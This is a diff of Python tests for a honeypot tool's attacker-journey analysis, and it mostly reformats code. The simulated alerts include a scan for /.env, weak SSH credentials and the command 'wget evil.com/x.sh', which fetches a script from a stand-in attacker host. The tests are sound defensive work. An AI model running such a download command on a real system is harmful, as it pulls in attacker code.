@@ -6,7 +6,7 @@ phase transitions are surfaced.
 """
 
 import os
-from datetime import datetime, timedelta, timezone
+from datetime import UTC, datetime, timedelta
 
 import pytest
 
@@ -16,6 +16,7 @@ os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"
 @pytest.fixture(autouse=True)
 async def setup_db():
     from honeypot_mcp.storage.database import close_db, init_db
+
     await init_db()
     yield
     await close_db()
@@ -25,17 +26,19 @@ async def _add_alert(ip, event_type, payload, hp_id=None, minutes_ago=10, severi
     from honeypot_mcp.storage.database import get_session
     from honeypot_mcp.storage.models import Alert, AlertSeverity
 
-    ts = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
+    ts = datetime.now(UTC) - timedelta(minutes=minutes_ago)
     async with get_session() as session:
-        session.add(Alert(
-            honeypot_id=hp_id,
-            source_ip=ip,
-            source_port=None,
-            event_type=event_type,
-            payload=payload,
-            severity=AlertSeverity(severity),
-            timestamp=ts,
-        ))
+        session.add(
+            Alert(
+                honeypot_id=hp_id,
+                source_ip=ip,
+                source_port=None,
+                event_type=event_type,
+                payload=payload,
+                severity=AlertSeverity(severity),
+                timestamp=ts,
+            )
+        )
 
 
 async def _add_honeypot(name, hp_type, port):
@@ -69,9 +72,17 @@ async def test_journey_reconstructs_multi_honeypot_timeline():
     # Recon phase — port scan / web scan
     await _add_alert(ip, "web_scan", {"path": "/.env"}, hp_id=http_id, minutes_ago=30)
     # Initial Access — SSH brute force
-    await _add_alert(ip, "ssh_login_failed", {"username": "root", "password": "123"}, hp_id=ssh_id, minutes_ago=20)
+    await _add_alert(
+        ip,
+        "ssh_login_failed",
+        {"username": "root", "password": "123"},
+        hp_id=ssh_id,
+        minutes_ago=20,
+    )
     # Execution — command run
-    await _add_alert(ip, "ssh_command_input", {"input": "wget evil.com/x.sh"}, hp_id=ssh_id, minutes_ago=10)
+    await _add_alert(
+        ip, "ssh_command_input", {"input": "wget evil.com/x.sh"}, hp_id=ssh_id, minutes_ago=10
+    )
 
     out = await analyze_attacker_journey(ip, hours=24)
     assert out["total_alerts"] == 3
@@ -94,7 +105,9 @@ async def test_journey_records_phase_transitions():
     ssh_id = await _add_honeypot("ssh-honey", "ssh", 2222)
 
     ip = "1.2.3.4"
-    await _add_alert(ip, "ssh_login_failed", {"username": "admin", "password": "x"}, hp_id=ssh_id, minutes_ago=15)
+    await _add_alert(
+        ip, "ssh_login_failed", {"username": "admin", "password": "x"}, hp_id=ssh_id, minutes_ago=15
+    )
     await _add_alert(ip, "ssh_command_input", {"input": "ls /"}, hp_id=ssh_id, minutes_ago=5)
 
     out = await analyze_attacker_journey(ip, hours=24)
@@ -112,7 +125,9 @@ async def test_journey_caps_chronological_output():
     ip = "7.7.7.7"
     # 250 events — chronological list should cap at 200
     for i in range(250):
-        await _add_alert(ip, "ssh_login_failed", {"attempt": i}, hp_id=ssh_id, minutes_ago=60 - (i * 0.1))
+        await _add_alert(
+            ip, "ssh_login_failed", {"attempt": i}, hp_id=ssh_id, minutes_ago=60 - (i * 0.1)
+        )
 
     out = await analyze_attacker_journey(ip, hours=24)
     assert out["total_alerts"] == 250
